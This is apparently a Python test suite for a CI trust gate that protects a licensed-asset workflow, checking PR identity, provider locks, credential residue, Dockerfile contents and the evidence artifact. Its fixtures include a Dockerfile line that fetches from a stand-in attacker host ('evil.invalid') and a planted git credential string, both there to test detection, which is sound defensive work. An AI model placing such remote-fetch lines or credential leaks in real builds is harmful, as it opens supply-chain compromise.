from __future__ import annotations

import importlib.util
import json
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[2]
HELPER = ROOT / "scripts/trusted-licensed-assets.py"

def load_helper(path=HELPER, name="trusted_licensed_assets"):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader
    spec.loader.exec_module(module)
    return module

h = load_helper()
SHA = "a" * 40
BASE = "b" * 40
DIGEST = "c" * 64

def pr_fixture():
    return {
        "number": 743, "state": "open", "draft": False,
        "user": {"login": "KirkDiggler", "type": "User"},
        "head": {"sha": SHA, "ref": "feat/743-safe", "repo": {"full_name": h.REPOSITORY, "fork": False}},
        "base": {"sha": BASE, "ref": "dev", "repo": {"full_name": h.REPOSITORY, "fork": False}},
    }

def provider_lock():
    return {
        "schemaVersion": 1,
        "provider": {"repository": h.PROVIDER_REPOSITORY, "commit": SHA},
        "catalog": {"path": "harness/catalogs/synty-web-assets.json", "sha256": DIGEST, "schemaVersion": 1, "catalogId": "synty-web-assets"},
        "inventory": {"path": "harness/catalogs/synty-complete-inventory.json", "sha256": DIGEST,
                      "schemaVersion": 1, "inventoryId": "synty-complete-tree",
                      "tool": {"name": "build_synty_complete_inventory", "version": "1.0.0"},
                      "fileCount": 1, "treeSha256": DIGEST},
        "tool": {"name": "build_web_asset_catalog", "version": "1.0.0"},
        "verifier": {"name": "verify_web_asset_stage", "version": "1.1.0"},
    }

class TrustTupleTests(unittest.TestCase):
    def test_workflow_identity_passes_only_exact_default_main(self):
        good = dict(event_name="workflow_dispatch", repository=h.REPOSITORY, actor=h.OWNER,
                    ref=h.DEFAULT_REF, workflow_ref=f"{h.REPOSITORY}/{h.WORKFLOW_PATH}@{h.DEFAULT_REF}",
                    workflow_sha=SHA, run_sha=SHA)
        h.validate_workflow_identity(**good)
        mutations = {
            "event_name": "pull_request_target", "repository": "attacker/fork", "actor": "mallory",
            "ref": "refs/heads/dev", "workflow_ref": f"{h.REPOSITORY}/{h.WORKFLOW_PATH}@refs/heads/dev",
            "workflow_sha": "abc", "run_sha": "d" * 40,
        }
        for key, value in mutations.items():
            bad = good | {key: value}
            with self.subTest(key=key), self.assertRaises(h.TrustError):
                h.validate_workflow_identity(**bad)

    def test_every_pr_trust_field_mutation_is_rejected(self):
        h.validate_pr(pr_fixture(), number=743, expected_sha=SHA, actor=h.OWNER, checkout_sha=SHA)
        mutations = [
            ("number", lambda p: p.update(number=744)),
            ("closed", lambda p: p.update(state="closed")),
            ("draft", lambda p: p.update(draft=True)),
            ("author", lambda p: p["user"].update(login="mallory")),
            ("bot", lambda p: p["user"].update(type="Bot")),
            ("stale", lambda p: p["head"].update(sha="d" * 40)),
            ("dependabot", lambda p: p["head"].update(ref="dependabot/npm/x")),
            ("wrong-repo", lambda p: p["head"]["repo"].update(full_name="mallory/fork")),
            ("fork", lambda p: p["head"]["repo"].update(fork=True)),
            ("wrong-base-repo", lambda p: p["base"]["repo"].update(full_name="mallory/fork")),
            ("wrong-base", lambda p: p["base"].update(ref="main")),
            ("base-sha", lambda p: p["base"].update(sha="short")),
        ]
        for label, mutate in mutations:
            bad = pr_fixture(); mutate(bad)
            with self.subTest(label=label), self.assertRaises(h.TrustError):
                h.validate_pr(bad, number=743, expected_sha=SHA, actor=h.OWNER, checkout_sha=SHA)
        with self.assertRaises(h.TrustError):
            h.validate_pr(pr_fixture(), number=743, expected_sha=SHA, actor="mallory")
        with self.assertRaises(h.TrustError):
            h.validate_pr(pr_fixture(), number=743, expected_sha=SHA, actor=h.OWNER, checkout_sha="d" * 40)

    def test_final_race_or_any_original_tuple_change_is_rejected(self):
        original = h.validate_pr(pr_fixture(), number=743, expected_sha=SHA, actor=h.OWNER)
        for mutate in (
            lambda p: p["head"].update(sha="d" * 40),
            lambda p: p["head"].update(ref="renamed"),
            lambda p: p["base"].update(sha="e" * 40),
            lambda p: p.update(draft=True),
            lambda p: p.update(state="closed"),
        ):
            live = pr_fixture(); mutate(live)
            with self.assertRaises(h.TrustError):
                h.validate_pr(live, number=743, expected_sha=SHA, actor=h.OWNER, original=original)

    def test_live_check_command_calls_live_api_and_rejects_stale(self):
        args = type("Args", (), dict(pr_number=743, expected_head_sha=SHA, head_ref="feat/743-safe",
                                      base_sha=BASE, actor=h.OWNER))()
        stale = pr_fixture(); stale["head"]["sha"] = "d" * 40
        with mock.patch.object(h, "fetch_pr", return_value=stale), self.assertRaises(h.TrustError):
            h.command_live_check(args)

    def test_mutant_removing_live_sha_equality_is_killed(self):
        source = HELPER.read_text()
        needle = 'require(head.get("sha") == expected_sha, "live PR head differs from expected SHA")'
        self.assertEqual(source.count(needle), 1)
        with tempfile.TemporaryDirectory() as td:
            mutant_path = Path(td) / "mutant.py"
            mutant_path.write_text(source.replace(needle, 'require(True, "live PR head differs from expected SHA")'))
            mutant = load_helper(mutant_path, "mutant_no_live_equality")
            stale = pr_fixture(); stale["head"]["sha"] = "d" * 40
            # The required behavior assertion fails against the mutant: the mutation is killed.
            with self.assertRaises(AssertionError):
                with self.assertRaises(mutant.TrustError):
                    mutant.validate_pr(stale, number=743, expected_sha=SHA, actor=mutant.OWNER)

class WorkflowContractTests(unittest.TestCase):
    def test_workflow_has_one_environment_secret_no_fallback_or_post_asset_cache(self):
        workflow = (ROOT / ".github/workflows/trusted-licensed-assets.yml").read_text()
        self.assertIn("environment: licensed-assets", workflow)
        self.assertEqual(workflow.count("${{ secrets.RPG_GAME_ASSETS_READ_TOKEN }}"), 1)
        self.assertNotIn("${{ secrets.ASSETS_READ_TOKEN }}", workflow)
        self.assertNotIn("actions/cache", workflow)
        self.assertIn("docker run --rm --network none --read-only --user 65532:65532", workflow)
        self.assertIn("--cap-drop ALL --security-opt no-new-privileges", workflow)
        self.assertIn("trusted-licensed-assets.py docker-proof", workflow)
        self.assertIn("actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02", workflow)
        self.assertNotRegex(workflow, r"(?m)^\s+(?:cat|tail|head) .*logs")

class ProviderAndCredentialTests(unittest.TestCase):
    def write_lock(self, root, value):
        path = Path(root) / "lock.json"; path.write_text(json.dumps(value)); return path

    def test_provider_lock_exact_schema_hash_and_tool_mutations(self):
        with tempfile.TemporaryDirectory() as td:
            h.parse_provider_lock(self.write_lock(td, provider_lock()))
            mutations = [
                lambda x: x["provider"].update(repository="attacker/assets"),
                lambda x: x["provider"].update(commit="main"),
                lambda x: x["catalog"].update(sha256="0"),
                lambda x: x["inventory"].update(treeSha256="0"),
                lambda x: x["inventory"].update(fileCount=0),
                lambda x: x["tool"].update(name="evil_generator"),
                lambda x: x["inventory"]["tool"].update(version="9.9.9"),
                lambda x: x["verifier"].update(version="1.0.0"),
                lambda x: x.update(extra="smuggle"),
            ]
            for mutate in mutations:
                value = provider_lock(); mutate(value)
                with self.assertRaises(h.TrustError): h.parse_provider_lock(self.write_lock(td, value))

    def test_missing_secret_and_broad_only_never_fall_back(self):
        with self.assertRaises(h.TrustError): h.validate_secret_input(None, None)
        with self.assertRaises(h.TrustError): h.validate_secret_input(None, "broad-token")
        self.assertEqual(h.validate_secret_input("environment-token", "broad-token"), "environment-token")

    def test_credential_env_config_and_provider_residue_rejected(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            h.credential_residue(root, {}, None)
            with self.assertRaises(h.TrustError): h.credential_residue(root, {"ASSETS_READ_TOKEN": "x"}, None)
            provider = root / "provider"; provider.mkdir()
            with self.assertRaises(h.TrustError): h.credential_residue(root, {}, provider)
            provider.rmdir(); (root / ".gitconfig").write_text("credential=https://x-access-token@github.com")
            with self.assertRaises(h.TrustError): h.credential_residue(root, {}, None)

class GitBoundaryTests(unittest.TestCase):
    def make_repo(self):
        td = tempfile.TemporaryDirectory(); root = Path(td.name)
        subprocess.run(["git", "init", "-q", root], check=True)
        subprocess.run(["git", "-C", root, "config", "user.email", "test@example.com"], check=True)
        subprocess.run(["git", "-C", root, "config", "user.name", "Test"], check=True)
        for name, data in {"Dockerfile": "FROM scratch\n", ".dockerignore": "", "package.json": "{}\n", "src/x.ts": "export {}\n"}.items():
            path=root/name; path.parent.mkdir(parents=True, exist_ok=True); path.write_text(data)
        subprocess.run(["git", "-C", root, "add", "."], check=True); subprocess.run(["git", "-C", root, "commit", "-qm", "base"], check=True)
        base=subprocess.check_output(["git", "-C", root, "rev-parse", "HEAD"], text=True).strip()
        return td, root, base

    def commit(self, root):
        subprocess.run(["git", "-C", root, "add", "-A"], check=True); subprocess.run(["git", "-C", root, "commit", "-qm", "head"], check=True)
        return subprocess.check_output(["git", "-C", root, "rev-parse", "HEAD"], text=True).strip()

    def test_quarantine_accepts_regular_diff_and_rejects_licensed_and_symlink(self):
        td, root, base = self.make_repo()
        try:
            (root/"src/x.ts").write_text("export const x=1\n"); head=self.commit(root)
            h.validate_quarantine(root, expected_sha=head, base_sha=base)
        finally: td.cleanup()
        td, root, base = self.make_repo()
        try:
            (root/"public/models/synty").mkdir(parents=True); (root/"public/models/synty/x.glb").write_bytes(b"glTF")
            head=self.commit(root)
            with self.assertRaises(h.TrustError): h.validate_quarantine(root, expected_sha=head, base_sha=base)
        finally: td.cleanup()
        td, root, base = self.make_repo()
        try:
            os.symlink("x.ts", root/"src/link"); head=self.commit(root)
            with self.assertRaises(h.TrustError): h.validate_quarantine(root, expected_sha=head, base_sha=base)
        finally: td.cleanup()

    def test_dockerfile_change_add_remote_and_context_symlink_fail_closed(self):
        td, root, base = self.make_repo()
        try:
            (root/"Dockerfile").write_text("FROM scratch\nADD https://evil.invalid/x /x\n"); self.commit(root)
            with tempfile.TemporaryDirectory() as out, self.assertRaises(h.TrustError):
                h.create_context(root, base, Path(out)/"context", None)
        finally: td.cleanup()
        td, root, base = self.make_repo()
        try:
            os.symlink("x.ts", root/"src/link"); self.commit(root)
            with tempfile.TemporaryDirectory() as out, self.assertRaises(h.TrustError):
                h.create_context(root, base, Path(out)/"context", None)
        finally: td.cleanup()

class HostedDockerFailClosedTests(unittest.TestCase):
    def test_hosted_docker_proof_refuses_unprovable_build_controls(self):
        with tempfile.TemporaryDirectory() as td:
            dockerfile = Path(td) / "Dockerfile"
            dockerfile.write_text("FROM node:23-alpine\nRUN npm ci\nRUN npm run build\n")
            with self.assertRaises(h.TrustError) as caught:
                h.validate_hosted_docker_proof(dockerfile)
            self.assertIn("cap-drop ALL", str(caught.exception))

    def test_removing_fail_closed_call_is_killed_by_policy_test(self):
        source = HELPER.read_text()
        needle = 'fail("GH-hosted Docker cannot prove nonroot, cap-drop ALL, and no-new-privileges for trusted-base Dockerfile RUN steps")'
        self.assertEqual(source.count(needle), 1)
        with tempfile.TemporaryDirectory() as td:
            mutant_path = Path(td) / "mutant_docker.py"
            mutant_path.write_text(source.replace(needle, "return None"))
            mutant = load_helper(mutant_path, "mutant_docker_weakening")
            dockerfile = Path(td) / "Dockerfile"; dockerfile.write_text("FROM node:23-alpine\nRUN npm run build\n")
            with self.assertRaises(AssertionError):
                with self.assertRaises(mutant.TrustError): mutant.validate_hosted_docker_proof(dockerfile)

class EvidenceOracleTests(unittest.TestCase):
    def evidence(self):
        return {"schema":"licensed-assets-evidence/v1","pr_number":743,"web_sha":SHA,"provider_sha":SHA,
                "catalog_sha256":DIGEST,"inventory_sha256":DIGEST,"tree_sha256":DIGEST,"asset_files":1,
                "functional_pass":True,"hash_pass":True,"matrix_pass":True,"matrix_cases":18,"sandbox_pass":True,"docker_pass":True,
                "perf_median_p95_ms":0.001,"final_live_head_equal":True,
                "kirk_visual_review":"external-pending","result":"pass"}

    def write(self, root, value, raw=None):
        path=Path(root)/"licensed-assets-evidence.json"
        path.write_bytes(raw if raw is not None else (json.dumps(value)+"\n").encode()); return path

    def test_artifact_exact_allowlist_and_smuggling_mutations(self):
        with tempfile.TemporaryDirectory() as td:
            h.validate_artifact(self.write(td, self.evidence()))
            for label, mutate in [
                ("field", lambda e: e.update(report="PR-authored")),
                ("token", lambda e: e.update(result="token=abc")),
                ("url", lambda e: e.update(result="https://example.invalid")),
                ("blob", lambda e: e.update(result="A"*200)),
                ("false-gate", lambda e: e.update(functional_pass=False)),
                ("perf", lambda e: e.update(perf_median_p95_ms=0.051)),
            ]:
                value=self.evidence(); mutate(value)
                with self.subTest(label=label), self.assertRaises((h.TrustError, json.JSONDecodeError)):
                    h.validate_artifact(self.write(td, value))
            with self.assertRaises((h.TrustError, json.JSONDecodeError)):
                h.validate_artifact(self.write(td, {}, raw=b"\x89PNG\r\n"))
            self.write(td, self.evidence()).unlink(); target=Path(td)/"target"; target.write_text(json.dumps(self.evidence()))
            os.link(target, Path(td)/"licensed-assets-evidence.json")
            with self.assertRaises(h.TrustError): h.validate_artifact(Path(td)/"licensed-assets-evidence.json")
            (Path(td)/"licensed-assets-evidence.json").unlink(); target.unlink(); target.write_text("x")
            os.symlink(target, Path(td)/"licensed-assets-evidence.json")
            with self.assertRaises(h.TrustError): h.validate_artifact(Path(td)/"licensed-assets-evidence.json")

    def test_private_log_stdout_secret_and_perf_gates(self):
        with tempfile.TemporaryDirectory() as td:
            path=Path(td)/"log"; path.write_text('{"medianP95MsPerResolve":0.01}\n')
            h.scan_private_log(path); self.assertEqual(h.parse_perf_log(path), 0.01)
            path.write_text('{"medianP95MsPerResolve":0.06}\n')
            with self.assertRaises(h.TrustError): h.parse_perf_log(path)
            path.write_text('token=stdout-canary\n')
            with self.assertRaises(h.TrustError): h.scan_private_log(path)
            path.write_text('STDOUT-CANARY\n')
            with self.assertRaises(h.TrustError): h.scan_private_log(path, ["STDOUT-CANARY"])

    def test_inventory_hash_functional_file_and_tree_mutations(self):
        with tempfile.TemporaryDirectory() as td:
            root=Path(td); provider=root/"provider"; stage=root/"stage"; (provider/"harness/catalogs").mkdir(parents=True)
            asset=stage/"models/synty/a.glb"; asset.parent.mkdir(parents=True); asset.write_bytes(b"glTF-safe-fixture")
            sha=h.sha256_file(asset); row=f"a.glb\0{asset.stat().st_size}\0{sha}\n"; tree=__import__('hashlib').sha256(row.encode()).hexdigest()
            inv={"schemaVersion":1,"inventoryId":"synty-complete-tree","root":"harness/models/synty",
                 "tool":{"name":"build_synty_complete_inventory","version":"1.0.0"},"fileCount":1,"treeSha256":tree,
                 "files":[{"path":"a.glb","size":asset.stat().st_size,"sha256":sha}]}
            invpath=provider/"harness/catalogs/synty-complete-inventory.json"; invpath.write_text(json.dumps(inv))
            lock=provider_lock(); lock["inventory"].update(sha256=h.sha256_file(invpath), treeSha256=tree)
            h.validate_inventory(provider, stage, lock)
            asset.write_bytes(b"mutated")
            with self.assertRaises(h.TrustError): h.validate_inventory(provider, stage, lock)

if __name__ == "__main__":
    unittest.main()
